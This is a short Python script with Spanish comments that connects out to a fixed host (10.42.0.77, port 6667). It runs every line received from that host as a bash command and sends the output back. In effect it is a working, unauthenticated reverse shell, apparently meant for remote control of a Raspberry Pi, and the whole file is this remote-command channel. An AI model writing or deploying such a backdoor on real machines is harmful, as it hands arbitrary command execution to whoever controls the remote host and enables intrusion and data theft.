import socket
import subprocess

def main():
    host = "10.42.0.77"
    port = 6667

    try:
        with socket.create_connection((host, port)) as sock:
            print(f"Conectado a {host}:{port}")
            sock_file = sock.makefile('r')

            while True:
                command = sock_file.readline()
                if not command:
                    command = "echo \"$USER@pi:`pwd`$\""
                else:
                    command = command.strip() +" && echo \"$USER@pi:`pwd`$\""
                try:
                    process = subprocess.Popen(
                        ["bash", "-c", command],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True
                    )

                    sock.send(b"@")  # Señal de inicio

                    for line in process.stdout:
                        output = line.strip()
                        if output:
                            print(output)
                            sock.send((output + "\n").encode("utf-8"))

                    sock.send(b'\x00')  # Señal de fin
                    process.stdout.close()
                    process.wait()


                except Exception as e:
                    error_msg = f"Error al ejecutar el comando: {e}"
                    print(error_msg)
                    sock.sendall((error_msg + "\n").encode("utf-8"))
                    sock.sendall(b'\x00')

    except Exception as e:
        print(f"Error de conexión o ejecución: {e}")

if __name__ == "__main__":
    main()
